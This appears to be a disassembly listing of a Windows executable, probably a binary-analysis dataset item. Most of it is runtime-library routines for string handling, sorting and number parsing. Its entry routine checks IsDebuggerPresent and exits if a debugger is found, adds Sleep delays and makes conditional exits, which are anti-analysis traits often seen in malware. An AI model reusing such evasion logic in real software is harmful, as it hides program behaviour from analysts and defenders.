mov bl [ ecx ]
mov dl [ eax ]
dec edi
mov [ eax ] bl
inc eax
mov [ ecx ] dl
inc ecx
pop ebx
mov ebx [ ecx ]
mov edx [ eax ]
mov [ eax ] ebx
mov [ ecx ] edx
add eax 0x4
add ecx 0x4
sub edi 0x4
dec esi
jne r-xdata
pop esi
jmp r-xdata
sub_409a9b
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ecx
sub eax ebx
je r-xdata
pop ebx
pop ebp
retn
push esi
push edi
mov edi [ ebp + 0x10 ]
jmp r-xdata
lea edx [ ebx + edi ]
cmp edx ecx
push ecx
mov [ ebp + 0x10 ] ebx
mov [ ebp + 0x8 ] ecx
push ebx
je r-xdata
call [ ebp + 0x14 ]
test eax eax
pop ecx
pop ecx
jle r-xdata
xor edx edx
div edi
mov esi eax
shr esi 0x1
imul esi edi
add esi ebx
call [ ebp + 0x14 ]
test eax eax
pop ecx
pop ecx
jle r-xdata
pop edi
pop esi
mov ecx [ ebp + 0xc ]
mov edx edi
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
jmp sub_409a5d
push [ ebp + 0xc ]
push esi
call [ ebp + 0x14 ]
test eax eax
pop ecx
pop ecx
jle r-xdata
mov ecx [ ebp + 0xc ]
mov edx edi
mov eax ebx
call sub_409a5d
push esi
push ebx
call [ ebp + 0x14 ]
test eax eax
pop ecx
pop ecx
jle r-xdata
mov ecx [ ebp + 0xc ]
mov edx edi
mov eax esi
call sub_409a5d
add [ ebp + 0x10 ] edi
push esi
push [ ebp + 0x10 ]
call [ ebp + 0x14 ]
test eax eax
pop ecx
pop ecx
jl r-xdata
mov edx edi
mov ecx esi
mov eax ebx
call sub_409a5d
sub [ ebp + 0x8 ] edi
push [ ebp + 0x8 ]
push esi
call [ ebp + 0x14 ]
test eax eax
pop ecx
pop ecx
jl r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
cmp eax ecx
jae r-xdata
cmp ecx ebx
jbe r-xdata
mov edx edi
call sub_409a5d
cmp esi [ ebp + 0x8 ]
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
sub ecx [ ebp + 0x10 ]
push [ ebp + 0x14 ]
sub eax ebx
cmp eax ecx
push edi
jle r-xdata
push [ ebp + 0x8 ]
push esi
call [ ebp + 0x14 ]
test eax eax
pop ecx
pop ecx
jne r-xdata
cmp esi [ ebp + 0x10 ]
jne r-xdata
mov esi [ ebp + 0x10 ]
jmp r-xdata
push [ ebp + 0x8 ]
push ebx
call sub_409a9b
mov ebx [ ebp + 0x10 ]
add esp 0x10
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
call sub_409a9b
mov eax [ ebp + 0x10 ]
add esp 0x10
sub eax edi
mov [ ebp + 0xc ] eax
jmp r-xdata
sub [ ebp + 0x8 ] edi
cmp [ ebp + 0x8 ] ebx
ja r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0xc ]
sub eax ebx
jne r-xdata
sub_409bde
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax 0x2
jb r-xdata
pop ebp
retn
cmp [ ebp + 0x10 ] 0x0
je r-xdata
push [ ebp + 0x14 ]
dec eax
imul eax [ ebp + 0x10 ]
push [ ebp + 0x10 ]
add eax [ ebp + 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_409a9b
add esp 0x10
sub_409c4f
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
or eax 0xffffffff
leave
retn
lea ecx [ ebp - 0x4 ]
push ecx
push 0x4
push eax
call [ CryptGenRandom@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
sub_409cfe
push eax
fwait
fnstcw [ esp ]
fwait
pop eax
push eax
and ah 0xf3
push eax
fldcw [ esp ]
pop eax
frndint
fldcw [ esp ]
pop eax
retn
sub_409d15
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0xc ] rw-data
mov [ ebp - 0x8 ] 0x1
call sub_408bc4
add esp 0xc
leave
retn
sub_409d54
fld [ esp + 0x4 ]
jmp r-xdata
fldl2e
fmulp st1
fld st0
frndint
fsub st1
fxch st1
f2xm1
fld1
faddp st1
fscale
fstp st1
fld st0
fld1
fdivrp st1
fsubp st1
fld [ r--data ]
fdivp st1
retn
sub_409d5a
fld [ esp + 0x4 ]
fldl2e
fmulp st1
fld st0
frndint
fsub st1
fxch st1
f2xm1
fld1
faddp st1
fscale
fstp st1
fld st0
fld1
fdivrp st1
fsubp st1
fld [ r--data ]
fdivp st1
retn
sub_409d85
push ebp
mov ebp esp
sub esp 0x10
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x10 ]
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x4 ] esi
call sub_408570
add esp 0xc
test esi esi
je r-xdata
pop edi
pop esi
leave
retn
cmp eax esi
lea ecx [ esi - 0x1 ]
jae r-xdata
mov [ ecx + edi ] 0x0
mov ecx eax
sub_409def
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0xc ]
call sub_408bc4
add esp 0xc
leave
retn
sub_409e18
push esi
mov esi [ GetStdHandle@IAT ]
push 0xfffffff6
call esi
or [ rw-data ] 0xffffffff
push 0xfffffff5
mov [ rw-data ] eax
call esi
or [ rw-data ] 0xffffffff
push 0xfffffff4
mov [ rw-data ] eax
call esi
or [ rw-data ] 0xffffffff
mov [ rw-data ] eax
xor eax eax
pop esi
retn
sub_409e53
push esi
mov esi [ esp + 0x8 ]
cmp [ esi ] 0x0
mov eax esi
je r-xdata
push [ esp + 0xc ]
push eax
call sub_409ed4
pop ecx
pop ecx
mov eax esi
pop esi
retn
inc eax
cmp [ eax ] 0x0
jne r-xdata
sub_409e8e
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
jmp r-xdata
mov al [ ecx ]
cmp al [ edx ]
je r-xdata
test al al
je r-xdata
movsx ecx [ edx ]
movsx eax al
sub eax ecx
retn
xor eax eax
retn
inc ecx
inc edx
sub_409ee9
mov ecx [ esp + 0x4 ]
push ebx
push esi
xor esi esi
cmp [ ecx ] 0x0
push edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
retn
mov eax [ esp + 0x14 ]
mov bl [ eax ]
inc esi
cmp [ esi + ecx ] 0x0
jne r-xdata
mov dl [ esi + ecx ]
mov al bl
test bl bl
mov edi [ esp + 0x14 ]
je r-xdata
inc edi
mov al [ edi ]
test al al
jne r-xdata
cmp al dl
je r-xdata
sub_409f43
push esi
mov esi [ esp + 0x8 ]
xor eax eax
cmp [ esi ] al
je r-xdata
push eax
push esi
call [ CharLowerBuffA@IAT ]
mov eax esi
pop esi
retn
inc eax
cmp [ eax + esi ] 0x0
jne r-xdata
sub_409f61
push esi
mov esi [ esp + 0x8 ]
cmp [ esi ] 0x0
mov eax esi
je r-xdata
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push eax
call sub_409fb8
add esp 0xc
mov eax esi
pop esi
retn
inc eax
cmp [ eax ] 0x0
jne r-xdata
sub_409f88
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
jmp r-xdata
xor eax eax
pop ebp
retn
dec [ ebp + 0x10 ]
jne r-xdata
mov al [ edx ]
cmp al [ ecx ]
jne r-xdata
movsx eax [ edx ]
movsx ecx [ ecx ]
sub eax ecx
pop ebp
retn
test al al
je r-xdata
inc edx
inc ecx
sub_409fb8
push esi
mov esi [ esp + 0x10 ]
test esi esi
je r-xdata
mov eax [ esp + 0x8 ]
pop esi
retn
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
test esi esi
je r-xdata
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
test esi esi
jne r-xdata
mov [ eax ] 0x0
dec esi
cmp [ eax ] 0x0
je r-xdata
or esi 0xffffffff
sub_409fe9
mov eax [ esp + 0x4 ]
mov dl [ eax ]
test dl dl
push ebx
push esi
push edi
je r-xdata
xor eax eax
mov edi [ esp + 0x14 ]
mov bl [ edi ]
inc eax
mov dl [ eax ]
test dl dl
jne r-xdata
mov cl bl
test bl bl
mov esi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
mov cl [ esi ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
sub_40a01c
mov eax [ esp + 0x4 ]
cmp [ eax ] 0x0
mov ecx eax
je r-xdata
movsx eax [ ecx ]
sub eax [ esp + 0x8 ]
neg eax
sbb eax eax
not eax
and eax ecx
retn
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
jmp r-xdata
cmp ecx eax
jne r-xdata
movsx edx [ ecx ]
cmp edx [ esp + 0x8 ]
je r-xdata
dec ecx
sub_40a04d
mov ecx [ esp + 0x4 ]
push ebx
push esi
xor esi esi
cmp [ ecx ] 0x0
push edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
retn
mov eax [ esp + 0x14 ]
mov bl [ eax ]
cmp [ edi ] 0x0
je r-xdata
mov dl [ esi + ecx ]
mov al bl
inc esi
cmp [ esi + ecx ] 0x0
jne r-xdata
inc edi
mov al [ edi ]
test al al
jne r-xdata
test bl bl
mov edi [ esp + 0x14 ]
je r-xdata
cmp al dl
je r-xdata
sub_40a08b
mov eax [ esp + 0x4 ]
cmp [ eax ] 0x0
push ebx
push esi
push edi
je r-xdata
xor eax eax
mov edi [ esp + 0x14 ]
mov esi eax
sub esi edi
cmp [ ebx + edi ] 0x0
je r-xdata
mov ecx edi
pop edi
pop esi
pop ebx
retn
inc eax
inc esi
cmp [ eax ] 0x0
jne r-xdata
inc ebx
inc ecx
mov dl [ ecx ]
test dl dl
jne r-xdata
mov dl [ edi ]
xor ebx ebx
test dl dl
je r-xdata
cmp [ esi + ecx ] dl
jne r-xdata
sub_40a0c9
push ebp
mov ebp esp
push ecx
fldz
mov eax [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
fld st0
jmp r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl 0x20
ja r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
inc eax
cmp cl 0x2b
fstp st1
je r-xdata
mov ecx [ ebp + 0xc ]
fstp st0
test ecx ecx
je r-xdata
xor edx edx
cmp cl 0x2d
sete dl
inc eax
mov [ ebp + 0x8 ] edx
cmp cl 0x2d
jne r-xdata
leave
retn
mov [ ecx ] eax
leave
retn
movzx ecx [ eax ]
sub ecx edi
cmp ecx esi
jb r-xdata
fld [ r--data ]
push esi
push edi
push 0x30
pop edi
push 0xa
pop esi
jmp r-xdata
test ecx ecx
fmul st1
mov [ ebp - 0x4 ] ecx
fild [ ebp - 0x4 ]
jge r-xdata
cmp [ eax ] 0x2e
fld [ r--data ]
jne r-xdata
faddp st2
inc eax
fadd [ r--data ]
mov cl [ eax ]
cmp cl 0x65
je r-xdata
fld st0
xor edx edx
inc eax
mov cl [ eax ]
cmp cl 0x2b
je r-xdata
cmp cl 0x45
jne r-xdata
fstp st0
test ecx ecx
mov [ ebp - 0x4 ] ecx
fild [ ebp - 0x4 ]
jge r-xdata
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
fstp st0
fmul st1
faddp st4
fmul st1
jmp r-xdata
fadd [ r--data ]
fstp st0
fstp st1
jmp r-xdata
fstp st0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ ecx ] eax
inc eax
movzx ecx [ eax ]
sub ecx edi
cmp ecx esi
jae r-xdata
movzx ecx [ eax ]
sub ecx edi
cmp ecx esi
jae r-xdata
inc eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
fstp st0
test ecx ecx
pop edi
pop esi
je r-xdata
imul edx edx 0xa
add edx ecx
inc eax
movzx ecx [ eax ]
sub ecx edi
cmp ecx esi
jb r-xdata
fchs
test edx edx
je r-xdata
test dl 0x1
je r-xdata
sar edx 0x1
fld st0
fmulp st1
jne r-xdata
fld st0
fmulp st2
jmp r-xdata
sub_40a1e7
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
cmp [ eax ] 0x0
push esi
push edi
mov edi [ esp + 0x10 ]
mov edx eax
je r-xdata
mov eax [ rw-data ]
cmp [ edx ] 0x0
mov ecx edx
mov esi edi
je r-xdata
push ebx
mov bl [ edi ]
mov eax edx
sub eax ecx
neg eax
sbb eax eax
pop edi
mov [ rw-data ] ecx
and eax edx
pop esi
retn
mov al [ ecx ]
cmp al [ esi ]
je r-xdata
cmp [ esi ] 0x0
je r-xdata
mov cl [ edx ]
mov al bl
mov [ ecx ] 0x0
inc ecx
inc esi
cmp [ esi ] 0x0
jne r-xdata
pop ebx
inc edx
cmp [ edx ] 0x0
jne r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp [ ecx ] 0x0
jne r-xdata
mov esi edi
inc ecx
test bl bl
mov esi edi
je r-xdata
cmp al cl
je r-xdata
jmp r-xdata
sub_40a25b
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
mov al [ ecx ]
test al al
push esi
push edi
mov edi [ ebp + 0xc ]
je r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
cmp [ ecx ] 0x0
mov edx ecx
mov esi edi
je r-xdata
push ebx
mov bl [ edi ]
mov eax [ ebp + 0x10 ]
mov [ eax ] edx
mov eax ecx
sub eax edx
neg eax
sbb eax eax
pop edi
and eax ecx
pop esi
pop ebp
retn
mov al [ edx ]
cmp al [ esi ]
je r-xdata
cmp [ esi ] 0x0
je r-xdata
mov dl bl
mov [ edx ] 0x0
inc edx
inc esi
cmp [ esi ] 0x0
jne r-xdata
pop ebx
inc ecx
mov al [ ecx ]
test al al
jne r-xdata
inc esi
mov dl [ esi ]
test dl dl
jne r-xdata
cmp [ edx ] 0x0
jne r-xdata
mov esi edi
inc edx
test bl bl
mov esi edi
je r-xdata
cmp dl al
je r-xdata
jmp r-xdata
sub_40a2d3
mov eax [ esp + 0x4 ]
push esi
push edi
xor esi esi
xor edi edi
jmp r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl 0x20
ja r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
inc eax
cmp cl 0x2b
je r-xdata
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
xor edx edx
cmp cl 0x2d
sete dl
inc eax
mov edi edx
cmp cl 0x2d
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ecx ] eax
cmp edx 0x10
jne r-xdata
cmp [ eax ] 0x30
je r-xdata
mov edx [ esp + 0x14 ]
test edx edx
jne r-xdata
pop edi
pop esi
retn
mov cl [ eax ]
test cl cl
jne r-xdata
cmp [ eax ] 0x30
jne r-xdata
lea ecx [ eax + 0x1 ]
mov dl [ ecx ]
cmp dl 0x78
je r-xdata
push 0xa
pop edx
jmp r-xdata
movzx ecx cl
cmp ecx 0x61
jb r-xdata
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
mov cl [ eax + 0x1 ]
cmp cl 0x78
je r-xdata
push 0x10
pop edx
jmp r-xdata
cmp dl 0x58
je r-xdata
cmp ecx 0x41
jb r-xdata
sub ecx 0x20
test edi edi
je r-xdata
mov [ ecx ] eax
inc eax
inc eax
jmp r-xdata
cmp cl 0x58
jne r-xdata
push 0x8
pop edx
mov eax ecx
jmp r-xdata
add ecx 0xffffffd0
cmp ecx 0x9
ja r-xdata
sub ecx 0x37
jmp r-xdata
mov eax esi
neg esi
cmp ecx edx
jae r-xdata
imul esi edx
add esi ecx
inc eax
sub_40a3a6
push esi
mov esi [ esp + 0x8 ]
xor eax eax
cmp [ esi ] al
je r-xdata
push eax
push esi
call [ CharUpperBuffA@IAT ]
mov eax esi
pop esi
retn
inc eax
cmp [ eax + esi ] 0x0
jne r-xdata
sub_40a3dc
fld [ esp + 0x4 ]
jmp r-xdata
fldl2e
fmulp st1
fld st0
frndint
fsub st1
fxch st1
f2xm1
fld1
faddp st1
fscale
fstp st1
fld st0
fld1
fdivrp st1
fld st1
fadd st1
fxch st2
fsubrp st1
fdivrp st1
retn
sub_40a3e2
fld [ esp + 0x4 ]
fldl2e
fmulp st1
fld st0
frndint
fsub st1
fxch st1
f2xm1
fld1
faddp st1
fscale
fstp st1
fld st0
fld1
fdivrp st1
fld st1
fadd st1
fxch st2
fsubrp st1
fdivrp st1
retn
sub_40a40d
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
inc [ rw-data ]
jne r-xdata
mov esi rw-data
movzx eax [ rw-data ]
push esi
push eax
push r--data
push r--data
call [ GetTempFileNameA@IAT ]
neg eax
sbb eax eax
and eax esi
pop esi
retn
mov [ rw-data ] 0x1
sub_40a47a
push eax
fwait
fnstcw [ esp ]
fwait
pop eax
push eax
or ah 0xc
push eax
fldcw [ esp ]
pop eax
frndint
fldcw [ esp ]
pop eax
retn
sub_40a4ac
push ebp
mov ebp esp
sub esp 0x400
push [ ebp + 0x10 ]
lea eax [ ebp - 0x400 ]
push [ ebp + 0xc ]
mov [ ebp - 0x400 ] 0x0
push eax
call [ wvsprintfA@IAT ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x400 ]
push eax
call sub_409510
pop ecx
pop ecx
leave
retn
sub_40a4e2
push ebp
mov ebp esp
sub esp 0x400
push [ ebp + 0xc ]
lea eax [ ebp - 0x400 ]
push [ ebp + 0x8 ]
mov [ ebp - 0x400 ] 0x0
push eax
call [ wvsprintfA@IAT ]
lea eax [ ebp - 0x400 ]
push rw-data
push eax
call sub_409510
pop ecx
pop ecx
leave
retn
sub_40a51a
push ebp
mov ebp esp
sub esp 0x10
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
push esi
mov esi [ ebp + 0xc ]
push edi
push [ ebp + 0x14 ]
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x10 ]
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x4 ] esi
call sub_408570
add esp 0xc
test esi esi
je r-xdata
pop edi
pop esi
leave
retn
cmp eax esi
lea ecx [ esi - 0x1 ]
jae r-xdata
mov [ ecx + edi ] 0x0
mov ecx eax
sub_40a570
push esi
mov esi [ esp + 0x8 ]
cmp [ esi ] 0x0
mov eax esi
je r-xdata
push [ esp + 0xc ]
push eax
call sub_40a5f9
pop ecx
pop ecx
mov eax esi
pop esi
retn
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
sub_40a5af
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
jmp r-xdata
movzx eax [ ecx ]
cmp ax [ edx ]
je r-xdata
test ax ax
je r-xdata
movzx eax [ ecx ]
movzx ecx [ edx ]
sub eax ecx
retn
xor eax eax
retn
inc ecx
inc ecx
inc edx
inc edx
sub_40a5f9
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
jmp r-xdata
movzx eax [ ecx ]
test ax ax
jne r-xdata
mov [ edx ] ax
inc edx
inc edx
inc ecx
inc ecx
and [ edx ] ax
mov eax [ esp + 0x4 ]
retn
sub_40a61a
mov edx [ esp + 0x4 ]
push ebx
xor eax eax
cmp [ edx ] ax
push esi
push edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ esp + 0x14 ]
movzx ebx [ ecx ]
inc eax
cmp [ edx + eax * 2 ] 0x0
jne r-xdata
movzx esi [ edx + eax * 2 ]
movzx ecx bx
test bx bx
mov edi [ esp + 0x14 ]
je r-xdata
inc edi
inc edi
movzx ecx [ edi ]
test cx cx
jne r-xdata
cmp cx si
je r-xdata
sub_40a66e
push esi
mov esi [ esp + 0x8 ]
cmp [ esi ] 0x0
mov eax esi
je r-xdata
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push eax
call sub_40a6cd
add esp 0xc
mov eax esi
pop esi
retn
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
sub_40a698
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
jmp r-xdata
xor eax eax
pop ebp
retn
dec [ ebp + 0x10 ]
jne r-xdata
movzx eax [ edx ]
cmp ax [ ecx ]
jne r-xdata
movzx eax [ edx ]
movzx ecx [ ecx ]
sub eax ecx
pop ebp
retn
test ax ax
je r-xdata
inc edx
inc edx
inc ecx
inc ecx
sub_40a6cd
mov edx [ esp + 0xc ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push esi
test edx edx
pop esi
je r-xdata
mov si [ ecx ]
mov [ eax ] si
inc eax
inc eax
inc ecx
inc ecx
test edx edx
jne r-xdata
and [ eax ] 0x0
dec edx
cmp [ eax ] 0x0
je r-xdata
or edx 0xffffffff
sub_40a704
mov eax [ esp + 0x4 ]
movzx edx [ eax ]
test dx dx
push ebx
push esi
push edi
je r-xdata
xor eax eax
mov ebx [ esp + 0x14 ]
movzx edi [ ebx ]
inc eax
inc eax
movzx edx [ eax ]
test dx dx
jne r-xdata
movzx ecx di
test di di
mov esi ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
inc esi
movzx ecx [ esi ]
test cx cx
jne r-xdata
cmp cx dx
je r-xdata
sub_40a743
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0x0
mov dx [ esp + 0x8 ]
mov eax ecx
je r-xdata
mov cx [ eax ]
sub cx dx
neg cx
sbb ecx ecx
not ecx
and eax ecx
retn
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
jmp r-xdata
cmp eax ecx
jne r-xdata
cmp [ eax ] dx
je r-xdata
dec eax
dec eax
sub_40a779
mov edx [ esp + 0x4 ]
push ebx
xor eax eax
cmp [ edx ] ax
push esi
push edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ esp + 0x14 ]
movzx ebx [ ecx ]
cmp [ esi ] 0x0
je r-xdata
movzx edi [ edx + eax * 2 ]
movzx ecx bx
inc eax
cmp [ edx + eax * 2 ] 0x0
jne r-xdata
inc esi
inc esi
movzx ecx [ esi ]
test cx cx
jne r-xdata
test bx bx
mov esi [ esp + 0x14 ]
je r-xdata
cmp cx di
je r-xdata
sub_40a7bf
mov eax [ esp + 0x4 ]
cmp [ eax ] 0x0
push esi
push edi
je r-xdata
xor eax eax
mov edi [ esp + 0x10 ]
cmp [ edi + esi * 2 ] 0x0
je r-xdata
xor ecx ecx
movzx edx dx
pop edi
pop esi
retn
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
inc esi
lea ecx [ esi + esi ]
movzx edx [ ecx + edi ]
test dx dx
jne r-xdata
movzx edx [ edi ]
xor esi esi
test dx dx
je r-xdata
cmp [ ecx + eax ] dx
jne r-xdata
sub_40a805
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
xor edi edi
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
movzx eax [ ecx ]
cmp ax di
je r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
cmp [ ecx ] di
mov eax [ ebp + 0xc ]
mov edx ecx
je r-xdata
mov edx [ ebp + 0xc ]
push ebx
movzx ebx [ edx ]
mov eax [ ebp + 0x10 ]
mov [ eax ] edx
mov eax ecx
sub eax edx
neg eax
sbb eax eax
pop edi
and eax ecx
pop esi
pop ebp
retn
mov si [ edx ]
cmp si [ eax ]
je r-xdata
cmp [ esi ] di
je r-xdata
movzx edx bx
mov [ edx ] di
inc edx
inc edx
inc eax
inc eax
cmp [ eax ] di
jne r-xdata
pop ebx
inc ecx
inc ecx
movzx eax [ ecx ]
cmp ax di
jne r-xdata
inc esi
inc esi
movzx edx [ esi ]
cmp dx di
jne r-xdata
cmp [ edx ] di
jne r-xdata
mov eax [ ebp + 0xc ]
inc edx
inc edx
cmp bx di
mov esi [ ebp + 0xc ]
je r-xdata
cmp dx ax
je r-xdata
jmp r-xdata
sub_40a893
xor eax eax
cmp [ esp + 0xc ] eax
jbe r-xdata
xor eax eax
retn
mov ecx [ esp + 0x4 ]
lea eax [ ecx + eax * 2 ]
retn
inc eax
cmp eax [ esp + 0xc ]
jb r-xdata
mov dx [ ecx + eax * 2 ]
cmp dx [ esp + 0x8 ]
je r-xdata
sub_40a8b8
push ebx
xor ecx ecx
cmp [ esp + 0x10 ] ecx
push esi
push edi
jbe r-xdata
xor eax eax
mov esi [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
mov edi esi
mov eax edx
sub edi edx
add ecx ecx
movzx eax [ ecx + esi ]
movzx ecx [ ecx + edx ]
sub eax ecx
jmp r-xdata
inc ecx
inc eax
inc eax
cmp ecx [ esp + 0x18 ]
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov bx [ edi + eax ]
cmp bx [ eax ]
jne r-xdata
sub_40a8f7
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
test edx edx
jbe r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
sub eax ecx
push esi
mov si [ eax + ecx ]
mov [ ecx ] si
inc ecx
inc ecx
dec edx
jne r-xdata
pop esi
sub_40a91c
mov eax [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
cmp eax esi
ja r-xdata
mov edx [ esp + 0x10 ]
test edx edx
je r-xdata
push [ esp + 0x10 ]
push esi
push eax
call sub_40a8f7
add esp 0xc
pop esi
retn
pop esi
retn
lea ecx [ eax + edx * 2 - 0x2 ]
sub esi eax
push edi
mov di [ esi + ecx ]
mov [ ecx ] di
dec edx
dec ecx
dec ecx
test edx edx
jne r-xdata
pop edi
sub_40a959
mov ecx [ esp + 0xc ]
test ecx ecx
jbe r-xdata
mov eax [ esp + 0x4 ]
retn
mov eax [ esp + 0x8 ]
mov dx ax
push edi
mov edi [ esp + 0x8 ]
shl edx 0x10
mov dx ax
shr ecx 0x1
mov eax edx
[ edi ]
adc ecx ecx
[ edi ]
pop edi
_start
push ebp
mov ebp esp
sub esp 0x74
push ebx
push esi
push edi
call sub_405e8e
call [ GetForegroundWindow@IAT ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
xor edx edx
push 0xa
pop ecx
div ecx
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0xc ]
imul eax eax 0x9
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
xor edx edx
push 0xa
pop ecx
div ecx
mov ecx eax
mov eax [ ebp - 0xc ]
xor edx edx
push 0xa
pop esi
div esi
add ecx edx
mov [ ebp - 0xc ] ecx
jmp r-xdata
call sub_40a9d7
retn
sub_40a9e9
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] sub_40a984
pusha
lea ebx [ ebp - 0x8 ]
mov [ fs : 0x0 ] ebx
popa
call sub_405ef9
push 0x8007
call [ SetErrorMode@IAT ]
call sub_405f54
call sub_4075d0
call sub_405fe1
call sub_4073bb
call sub_406017
push 0x40
call [ GetCurrentProcess@IAT ]
push eax
call [ SetPriorityClass@IAT ]
call sub_401000
cmp eax 0x1
jne r-xdata
call [ IsDebuggerPresent@IAT ]
test eax eax
je r-xdata
push 0x0
call [ ExitProcess@IAT ]
call sub_405ef9
call sub_4073fb
call sub_405f54
call sub_409c15
mov [ ebp - 0x64 ] eax
fild [ ebp - 0x64 ]
fdiv [ r--data ]
push ecx
push ecx
fstp [ esp ]
call sub_40a470
pop ecx
pop ecx
call sub_408164
push eax
call [ Sleep@IAT ]
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov eax [ rw-data ]
and eax 0xff
push eax
mov ecx rw-data
call sub_407eb0
mov eax [ rw-data ]
sar eax 0x8
and eax 0xff
push eax
mov ecx rw-data
call sub_407eb0
mov eax [ rw-data ]
sar eax 0x10
and eax 0xff
push eax
mov ecx rw-data
call sub_407eb0
mov eax [ rw-data ]
sar eax 0x18
and eax 0xff
push eax
mov ecx rw-data
call sub_407eb0
mov eax [ rw-data ]
dec eax
mov [ rw-data ] eax
call sub_405e8e
push r--data
call sub_4027c9
pop ecx
call sub_405ef9
call sub_402819
call sub_405f54
call sub_403ab3
call sub_401020
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
call [ ExitProcess@IAT ]
call sub_403925
call sub_405fe1
call sub_405393
call sub_405ef9
call sub_404bc8
call sub_404ed4
call sub_405ef9
call sub_405e8e
call sub_4048fc
call sub_406017
call sub_401a01
call sub_405fe1
call sub_40299b
call sub_405f54
push 0x15
call sub_409984
pop ecx
mov [ ebp - 0x38 ] eax
cmp [ ebp - 0x38 ] 0x0
je r-xdata
push 0x0
call [ ExitProcess@IAT ]
and [ ebp - 0x68 ] 0x0
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
mov ecx [ ebp - 0x38 ]
call sub_4077a2
mov [ ebp - 0x68 ] eax
jmp r-xdata
and [ ebp - 0x6c ] 0x0
push 0x1
